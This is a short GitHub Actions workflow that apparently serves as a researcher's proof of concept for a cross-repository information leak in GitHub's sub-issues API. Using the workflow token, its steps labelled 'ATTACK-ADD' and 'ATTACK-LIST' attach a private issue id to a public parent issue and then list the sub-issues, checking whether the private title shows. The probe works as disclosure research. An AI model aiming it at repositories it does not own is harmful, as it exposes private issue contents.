name: probe
on: { workflow_dispatch: {} }
permissions:
  issues: write
  contents: read
jobs:
  t:
    runs-on: ubuntu-latest
    steps:
      - env:
          GH: ${{ github.token }}
        run: |
          A="Authorization: Bearer $GH"; J="Accept: application/vnd.github+json"
          echo "### CONTROL direct-read PRIVATE si-child (expect 404):"
          curl -s -o /tmp/c -w "HTTP %{http_code}\n" -H "$A" -H "$J" https://api.github.com/repos/jackpas23/si-child/issues/1; head -c 200 /tmp/c; echo
          echo "### ATTACK-ADD cross-repo sub_issue (private child id 4661219265 -> parent#2):"
          curl -s -o /tmp/a -w "HTTP %{http_code}\n" -X POST -H "$A" -H "$J" https://api.github.com/repos/jackpas23/si-parent/issues/2/sub_issues -d '{"sub_issue_id":4661219265}'; head -c 500 /tmp/a; echo
          echo "### ATTACK-LIST sub_issues of parent#2 (leak private title?):"
          curl -s -H "$A" -H "$J" https://api.github.com/repos/jackpas23/si-parent/issues/2/sub_issues | python3 -c "import sys,json;d=json.load(sys.stdin);print([{'repo':x.get('repository',{}).get('full_name'),'title':x.get('title')} for x in d] if isinstance(d,list) else d)"
